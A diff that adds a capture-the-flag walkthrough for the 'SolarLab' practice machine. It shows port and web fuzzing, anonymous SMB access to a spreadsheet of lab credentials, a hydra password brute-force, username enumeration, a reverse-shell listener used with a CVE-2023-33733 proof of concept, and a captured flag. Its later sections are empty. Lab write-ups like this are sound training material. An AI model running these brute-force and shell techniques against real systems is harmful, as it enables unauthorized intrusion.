@@ -1,0 +1,206 @@
+---
+title: SolarLab
+banner: /avatars/solar-lab.webp
+difficulty: medium
+os: windows
+releaseDate: 2024-05-11
+pwnDate: 2024-05-12
+slug: "solar-lab"
+achievement: 
+---
+
+import Browser from "@/components/Browser.astro" 
+
+## Enumeration
+
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.16 -oG allPorts
+
+PORT     STATE SERVICE      REASON
+80/tcp   open  http         syn-ack ttl 127
+135/tcp  open  msrpc        syn-ack ttl 127
+139/tcp  open  netbios-ssn  syn-ack ttl 127
+445/tcp  open  microsoft-ds syn-ack ttl 127
+6791/tcp open  hnm          syn-ack ttl 127
+```
+
+```bash
+sudo nmap -p80,135,139,445,6791 -sCV 10.10.11.16 -oN targeted
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          nginx 1.24.0
+|_http-title: Did not follow redirect to http://solarlab.htb/
+|_http-server-header: nginx/1.24.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+6791/tcp open  http          nginx 1.24.0
+|_http-server-header: nginx/1.24.0
+|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 1s
+| smb2-time: 
+|   date: 2024-05-17T12:45:39
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+```
+
+```bash
+sudo sh -c 'echo "10.10.11.16 solarlab.htb report.solarlab.htb" >> /etc/hosts'
+```
+
+<Browser
+  url="solarlab.htb"
+  src="/walkthroughs/solar-lab/0.png"
+/>
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://solarlab.htb/FUZZ" -mc "all" -fc 404
+
+Images                  [Status: 301, Size: 169, Words: 5, Lines: 8]
+assets                  [Status: 301, Size: 169, Words: 5, Lines: 8]
+con                     [Status: 500, Size: 177, Words: 7, Lines: 8]
+images                  [Status: 301, Size: 169, Words: 5, Lines: 8]
+index.html              [Status: 200, Size: 16210, Words: 842, Lines: 473]
+nul                     [Status: 500, Size: 177, Words: 7, Lines: 8]
+render/https://www.google.com [Status: 500, Size: 177, Words: 7, Lines: 8]
+```
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://solarlab.htb" -H 'Host: FUZZ.solarlab.htb' -fs 169;
+```
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://solarlab.htb:6791" -H 'Host: FUZZ.solarlab.htb' -fs 169
+
+report                  [Status: 200, Size: 2045, Words: 772, Lines: 85]
+```
+
+<Browser
+  url="report.solarlab.htb:6791/"
+  src="/walkthroughs/solar-lab/1.png"
+/>
+
+```bash
+smbclient -N -L //10.10.11.16
+
+Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Documents       Disk      
+	IPC$            IPC       Remote IPC
+```
+
+```bash
+smbclient -N //10.10.11.16/Documents
+
+smb: \> ls
+  .                                  DR        0  Fri Apr 26 16:47:14 2024
+  ..                                 DR        0  Fri Apr 26 16:47:14 2024
+  concepts                            D        0  Fri Apr 26 16:41:57 2024
+  desktop.ini                       AHS      278  Fri Nov 17 11:54:43 2023
+  details-file.xlsx                   A    12793  Fri Nov 17 13:27:21 2023
+  My Music                        DHSrn        0  Thu Nov 16 20:36:51 2023
+  My Pictures                     DHSrn        0  Thu Nov 16 20:36:51 2023
+  My Videos                       DHSrn        0  Thu Nov 16 20:36:51 2023
+  old_leave_request_form.docx         A    37194  Fri Nov 17 11:35:57 2023
+
+		7779839 blocks of size 4096. 1857200 blocks available
+smb: \> get details-file.xlsx
+getting file \details-file.xlsx of size 12793 as details-file.xlsx (65.1 KiloBytes/sec) (average 65.1 KiloBytes/sec)
+```
+
+![details-file.xlsx](/walkthroughs/solar-lab/2.png)
+
+| Email | Usernames | Passwords |
+| ----- | --------- | --------- | 
+| Alexander.knight@gmail.com | Alexander.knight@gmail.com | al;ksdhfewoiuh |
+| Alexander.knight@gmail.com | KAlexander | dkjafblkjadsfgl |
+| Claudia.springer@gmail.com | Alexander.knight@gmail.com | d398sadsknr390 |
+| blake@purdue.edu | blake.byte | ThisCanB3typedeasily1@ |
+| Alexander.knight@gmail.com | AlexanderK | danenacia9234n |
+| Claudia.springer@gmail.com | ClaudiaS | dadsfawe9dafkn |
+
+when testing with the different users those that get a different message ("User authentication error.") and that therefore seem to exist within the portal are"AlexanderK" and "ClaudiaS".
+
+```bash
+hydra -l AlexanderK -P /usr/share/wordlists/rockyou.txt report.solarlab.htb -s 6791 http-post-form '/:username=^USER^&password=^PASS^:F=action="/login"' -v
+
+<...SNIP...>
+0 of 1 target completed, 0 valid password found
+```
+
+```
+Alexander.knight
+KAlexander
+AlexanderK
+Claudia.springer
+SClaudia
+ClaudiaS
+Blake.byte 
+BBlake
+BlakeB
+```
+
+```bash
+ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames:USER -w <(echo test):PASS -fr "User not found."
+
+[Status: 200, Size: 2144, Words: 812, Lines: 87]
+    * USER: BlakeB
+    * PASS: test
+
+[Status: 200, Size: 2144, Words: 812, Lines: 87]
+    * USER: AlexanderK
+    * PASS: test
+
+[Status: 200, Size: 2144, Words: 812, Lines: 87]
+    * USER: ClaudiaS
+    * PASS: test
+```
+
+![burpsuite intruder](/walkthroughs/solar-lab/3.png)
+
+`BlakeB:ThisCanB3typedeasily1@`
+
+## Exploitation
+
+<Browser
+  url="report.solarlab.htb:6791/homeOfficeRequest"
+  src="/walkthroughs/solar-lab/4.png"
+/>
+
+![burpsuite intruder](/walkthroughs/solar-lab/5.png)
+
+https://github.com/c53elyas/CVE-2023-33733
+
+```bash
+nc -lvnp 5000
+```
+
+![burpsuite + poc](/walkthroughs/solar-lab/6.png)
+
+```bash
+PS C:\Users\blake\Documents\app> cat ../../Desktop/user.txt
+145a80073bcc9bf8699ebe25f215304c
+```
+
+## Post Exploitation
+
+```bash
+```
+
+```bash
+```
+
+## Privilege Escalation
+
+```bash
+```
+
+```bash
+```
